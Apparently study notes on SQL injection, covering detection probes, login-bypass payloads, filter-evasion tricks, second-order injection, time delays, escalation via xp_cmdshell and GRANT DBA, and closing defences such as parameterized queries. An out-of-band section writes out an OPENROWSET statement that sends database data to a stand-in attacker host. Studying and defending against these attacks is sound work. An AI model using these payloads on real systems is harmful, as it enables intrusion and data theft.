# Injecting Code

## Into Interpreted Language
Attackers' input gets passed directly to the interpreter and runs as if it's legit code.
- Depends upon the language targeted.
- Programming technique employed by the application developer.
- Supplying unexpected syntax may cause read errors → check for indication of code injection vulnerability.

## Injecting Into SQL
- Databases are used by almost all web applications to store data like user details, prices, account statements, etc.
- By editing certain commands or statements and using vulnerable web parts, we can read, update, add, and delete data in the database

## Retrieving Hidden Data
Check if SQL injection is possible or not:
- Try single quotation or double quotation as input.
- Try `--` → observe the response.
- Try `%` → if the server is interacting with the back-end database, submitting `%` may return some table or data.
- Try `' OR 1=1--` → will bypass any true statement check, as `1=1` is always true.
- Try supplying a mathematical expression that is equivalent to the original numerical value.

**Useful notes:**
- Use ASCII commands and quotes.
- Remember:
  - spaces ⇔ `+` or `%20`
  - `+` ⇔ `%2b`
  - `;` ⇔ `%3b`

## Bypassing a Login
Every login page is connected to the backend most of the time, where it checks for username and password. If they match, it lets you log in.

- We can bypass this login check if we know a username.
- Example:
```sql
SELECT * FROM USERS WHERE USERNAME = 'ADMIN'--' AND PASSWORD = 'FOO'
```
This is equivalent to:
```sql
SELECT * FROM USERS WHERE USERNAME = 'ADMIN'
```
⇒ This way, the password check has been bypassed altogether.

- If you don't know a username, you can use:
```sql
USERNAME = ' OR 1=1--
```
- Since `1=1` is always true, this can bypass the check.

## Subverting Application Logic
- Example: username = `wiener` and password = `bluecheese`.
- This can be bypassed using:
  - If you have a username like `administrator`, try:
    ```sql
    administrator'--
    ```
  - If you don't have a username, then try:
    ```sql
    username = admin
    password = ' OR 1=1--
    ```

## Injecting into Different Statement Types
The most common types of SQL statements are:

- **SELECT**
- **INSERT**
  - Use this for finding table column size and type, e.g.:
    ```sql
    foo')--
    foo',1)--
    foo',1,1)--
    ```
- **UPDATE**
  - Example of bypassing password check and resetting the password:
    ```sql
    update users set password='newsecret' where user='admin' or 1=1
    ```
- **DELETE**
- **The UNION operator**
- **Fingerprinting the database**
- **Extracting useful data**

**Notes:**
- If you don't know the data type of columns in a table, you can always use:
  ```sql
  SELECT NULL
  ```
- Use trial-and-error to find table names, column types, and column names.

### Techniques
- If the `SELECT` statement is blocked or removed, try:
  ```sql
  SeLeCt
  SELSELECTECT
  %53%54%4C%45%43%54
  ```
- In MySQL, comments can be inserted within keywords to bypass validation, for example:
  ```sql
  SEL /*FOO*/ECT username,password FR/*foo*/OM users
  ```
- If the defense filter escapes or doubles up a single quotation mark, you can bypass it with escape quotations. Example:
  ```sql
  aaaa'
  ```

## Second Order SQL Injection
- An attacker can register a username containing crafted input and then attempt to change their password.
- Example:
  ```sql
  'or 1 in (select password from users where username='admin')--
  ```
- When the attacker tries to change their password, the injected query will be executed → Revealing the admin password.

**Note:** Not every attack is about stealing information — some just want to destroy your system/device.

## Using an Out-of-Band Channel

Many times the webserver or browser don't let table to show or don't let the server to display stuff when any injection is done or taking place. Hence we think that the injection didn't work or the website is not prone to SQL injection, but in reality everything is prone to injection, it's just not visible to you.

So for that we will transfer the table or data to an out-of-band channel or network where we can see these data directly.

### MS-SQL

Use OpenRowSet command can be used to open a connection to an external database and insert arbitrary data into it.

```sql
insert into openrowset('SQLOLEDB',
'DRIVER={SQL Server};SERVER=wahh-attacker.com,80;UID=sa;PWD=letmein',
'select * from foo') values (@@version)
```

**Note:** You can specify port 80 or any port of your wish.

### Oracle

1. UTL_HTTP package can be used to make arbitrary HTTP requests to other hosts.
2. UTL_INADDR: is designed to resolve host names to IP address → generate arbitrary DNS queries to controlled server.
3. UTL_SMTP: used to send email (outbound email).
4. UTL_TCP: to open arbitrary TCP sockets to send and receive network data.

### MYSQL

- `select ...... into OUTFILE` => command
- Specified filename may contain a UNC path, to direct the output to a file on your computer.
- To receive the file you will need to create a SMB share on your own computer that allows write access.
- Use sniffer to confirm whether the target server is initiating any inbound connection to your computer.

**Reason of failure**: Usually all databases are located within a protected network whose perimeter firewall does not allow any inbound connection to internet or network.

**NOTE**: When you are restricted to accessing database entirely via your injection point into the web application, then you should try to perform conditional responses or conditional errors.

**Tool**: Absinthe
- Automated tool to perform conditional response on web application.
- Can easily retrieve username, table info, table name, load field info.
- Will return all data in table format. You can retrieve it using download records tab.

## Using Time Delays

Certain times you will not get any response using any of the previous techniques. Hence you gotta use time-delays:

- **MS-SQL**: 
  - `waitfor` command
  - `power` command
- **Oracle**: `UTL_HTTP` to connect to a non-existent server causing a timeout
- **MySQL**: use benchmark function to time delay

## Beyond SQL Injection => Escalating the Database Attack

- **MS-SQL**: 
  - xp_cmdshell
  - xp_regread
  - xp_regwrite
- **Oracle**: by injecting the query `GRANT DBA TO PUBLIC` into the vulnerable field
- **MYSQL**: MySQL enables users to create user-defined functions by calling out to a compiled library file that contains the function's implementation

## Preventing SQL Injection

- Escaping any single quotation marks within user input by doubling them up
  - Using numerical SQL queries
  - Using second-order SQL injection attacks
- Use of stored procedure for all database access
  - Flaw in stored procedure own code
  - Using batch query

### Parameterized Queries

They split query structure from data. You declare the SQL with placeholders (?) then bind user data - so data can never change the SQL syntax.

**How they stop Injection**: The DB engine treats bound values strictly as data not executable SQL, so injected payload can't alter query logic

**NOTE**: 
1. Use them everywhere
   - Treat every single query as potentially dangerous, don't selectively apply them.
2. Parametrize every data item.
3. You can't parametrize table/column names
   - If you must let user choose table/column, use a whitelist of allowed values (or strict validation).

## Defense in Depth (Three Layers)

- Application should use the lowest possible level of privileges when accessing database
  - Only read and write its own data.
  - If 90% of the database can be accessed using only read, then no need of write.
  - If some file like user data is to be protected, then level of access can be used.
- Many enterprise databases include a huge amount of default functions that can be leveraged by attackers
  - Unnecessary functions should be removed or disabled.
- All vendor-issued security patches should be evaluated, tested and applied in a timely way.



